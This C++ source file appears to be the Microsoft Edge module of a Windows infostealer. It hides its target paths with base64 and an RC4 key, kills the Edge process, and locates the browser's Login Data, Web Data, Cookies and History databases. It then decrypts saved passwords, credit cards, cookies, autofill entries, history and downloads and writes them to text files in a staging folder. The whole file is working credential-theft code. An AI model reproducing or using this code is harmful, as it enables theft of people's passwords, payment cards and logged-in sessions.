#include "Edg.h"
#include "Paths.h"
#include "BrowserUtils.h"
#include "DecryptChromium.h"
#include <sstream>
#include <codecvt>
#include <regex>
#include <vector>
#include <filesystem>
#include <Shlwapi.h>
#define  _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
#include <experimental/filesystem>
#include "Filemanager.h"
#include "base64.h"
#include "rc4.h"
#include <shlobj.h> // For SHGetFolderPath
#include <windows.h>
#include <fstream>
#include <string>
#include <iostream>

namespace fs = std::experimental::filesystem;

#pragma comment(lib, "Shlwapi.lib")

std::string Edg::Replace(std::string str, std::string substr, std::string newsubstr)
{
    size_t pos = 0; // Start from the beginning of the string
    while ((pos = str.find(substr, pos)) != std::string::npos) {
        // Find the next occurrence of `substr` starting from position `pos`
        str.replace(pos, substr.length(), newsubstr);
        // Replace `substr` with `newsubstr` at the found position
        pos += newsubstr.length();
        // Move the position forward to avoid replacing the newly inserted text
    }
    return str; // Return the modified string
}

std::string Edg::FindSubstring(std::string str)
{
    size_t pos1 = str.find("\\");
    // Find the first occurrence of the backslash character

    if (pos1 != std::string::npos) {
        // Check if the first backslash was found
        size_t pos2 = str.find("\\", pos1 + 1);
        // Find the second backslash starting after `pos1`

        if (pos2 != std::string::npos) {
            // Check if the second backslash was found
            return str.substr(pos1 + 1, pos2 - pos1 - 1);
            // Extract and return the substring between the two backslashes
        }
    }
    return ""; // Return an empty string if conditions aren't met
}

std::string Edg::BrowserPathToAppName(std::string sLoginData)
{
    if (sLoginData.find("Opera") != std::string::npos) {
        // Check if the string contains "Opera"
        return "Opera"; // Return "Opera" if found
    }

    std::string replace = Replace(sLoginData, Paths::Lappdata, "");
    // Remove `Paths::Lappdata` from `sLoginData`

    std::string substring = FindSubstring(replace);
    // Extract the substring between backslashes in the modified string

    return substring; // Return the extracted substring
}

bool Edg::PathExists(const std::string& path)
{
    struct stat info;
    // `stat` structure to hold file information

    return (stat(path.c_str(), &info) == 0);
    // Check if the path exists by calling `stat`
}

std::vector<std::string> Edg_find_files(const std::string& path, const std::vector<std::string>& filenames)
{
    std::vector<std::string> results(filenames.size());
    // Create a vector to store results for each filename

    if (!fs::exists(path) || !fs::is_directory(path)) {
        // If the path doesn't exist or isn't a directory, return empty results
        return results;
    }

    std::vector<std::string> subdirs;
    // Vector to store subdirectories

    for (auto& entry : fs::directory_iterator(path)) {
        // Iterate through each entry in the directory
        auto subpath = entry.path().string();
        // Convert the path to a string

        if (fs::is_directory(entry.status())) {
            // If the entry is a directory, add it to `subdirs`
            subdirs.push_back(subpath);
        }
        else if (fs::is_regular_file(entry.status())) {
            // If the entry is a regular file
            auto filename_ = entry.path().filename().string();
            // Get the filename as a string

            for (size_t i = 0; i < filenames.size(); ++i) {
                // Compare it with the filenames we're looking for
                if (filename_ == filenames[i]) {
                    results[i] = subpath;
                    // Store the full path in the corresponding result
                }
            }
        }
    }

    for (auto& subdir : subdirs) {
        // Recursively search in subdirectories
        auto subresults = Edg_find_files(subdir, filenames);
        for (size_t i = 0; i < filenames.size(); ++i) {
            if (!subresults[i].empty()) {
                results[i] = subresults[i];
                // Update the results with non-empty matches
            }
        }
    }

    return results; // Return the list of found files
}

bool Edg_createdir(std::string path)
{
    DWORD attr = GetFileAttributes(path.c_str());
    // Get attributes of the directory

    if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
        // Check if the directory exists
        if (!RemoveDirectory(path.c_str())) {
            // Try to remove the directory if it exists
            std::cerr << "Failed to remove directory." << std::endl;
            return 1; // Indicate failure
        }
    }

    if (!CreateDirectory(path.c_str(), NULL)) {
        // Attempt to create the directory
        std::cerr << "Failed to create directory." << std::endl;
        return 1; // Indicate failure
    }
    return true; // Indicate success
}

void Edg::Run(std::string sSavePath)
{
    // Check if the provided save path exists, otherwise create it
    if (GetFileAttributesA(sSavePath.c_str()) == INVALID_FILE_ATTRIBUTES) {

        // Try to create the directory for saving data
        if (!CreateDirectoryA(sSavePath.c_str(), nullptr) && GetLastError() != ERROR_ALREADY_EXISTS) {
            std::cerr << "Error creating folder: " << GetLastError() << std::endl;
            return; // Exit if folder creation fails
        }
    }

    if (!PathExists(sSavePath)) {

        if (!CreateDirectoryA(sSavePath.c_str(), nullptr) && GetLastError() != ERROR_ALREADY_EXISTS) {
            std::cerr << "Error creating folder: " << GetLastError() << std::endl;
            return; // Exit if folder creation fails
        }
    }

    for (auto& spath : Paths::EdgePath)
    {
        std::string ChromiumPswPaths = base64_decode(spath);
        const unsigned char* ChromiumPswPaths_str_To_char = reinterpret_cast<const unsigned char*>(ChromiumPswPaths.c_str());
        char* decStr_char = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)ChromiumPswPaths_str_To_char, ChromiumPswPaths.length());
        std::string decStr(reinterpret_cast<char*>(decStr_char));

        std::string sFullPath = Paths::Lappdata + "\\" + decStr;

        Filemanager::killprocess("msedge.exe");

        if (PathExists(sFullPath)) {

            std::vector<std::string> filenames = { "Web Data", "Login Data", "Cookies","History" };
            auto results = Edg_find_files(sFullPath, filenames);

            std::string WebDataPath = results[0];
            std::string LoginDataPath = results[1];
            std::string CookiesPath = results[2];
            std::string HistoryPath = results[3];

            std::string sBDir = sSavePath + "\\Edg";

            if (!Edg_createdir(sBDir))
            {
                return;
            }

            //// Decrypt the extracted data from the temporary files
            std::vector<CreditCard> pCreditCards = DecryptChromium::DecryptCreditCard(WebDataPath, EDGE);
            std::vector<Password> pPasswords = DecryptChromium::DecryptPassword(LoginDataPath, EDGE);
            std::vector<Cookie> pCookies = DecryptChromium::DecryptCookie(CookiesPath, EDGE);
            std::vector<Site> pHistory = DecryptChromium::DecryptHistory(HistoryPath);
            std::vector<Download> pDownloads = DecryptChromium::DecryptDownloads(HistoryPath);
            std::vector<AutoFill> pAutoFill = DecryptChromium::DecryptAutoFill(WebDataPath);

            //// Define paths for storing the decrypted data
            std::string passwordsFilePath = sBDir + "\\Passwords_Info.txt";
            std::string CreditCardsPath = sBDir + "\\CreditCards_Info.txt";
            std::string cookiesFilePath = sBDir + "\\Cookies_Info.txt";
            std::string historyFilePath = sBDir + "\\History_Info.txt";
            std::string downloadsFilePath = sBDir + "\\Downloads_Info.txt";
            std::string autoFillFilePath = sBDir + "\\AutoFill_Info.txt";

            //// Write the decrypted data to respective files
            BrowserUtils::WritePasswords(pPasswords, passwordsFilePath);
            BrowserUtils::WriteCreditCards(pCreditCards, CreditCardsPath);
            BrowserUtils::WriteCookies(pCookies, cookiesFilePath);
            BrowserUtils::WriteHistory(pHistory, historyFilePath);
            BrowserUtils::WriteDownload(pDownloads, downloadsFilePath);
            BrowserUtils::WriteAutoFill(pAutoFill, autoFillFilePath);
        }
        else {
            std::cout << "The path does not exist." << std::endl;
        }

    }

}
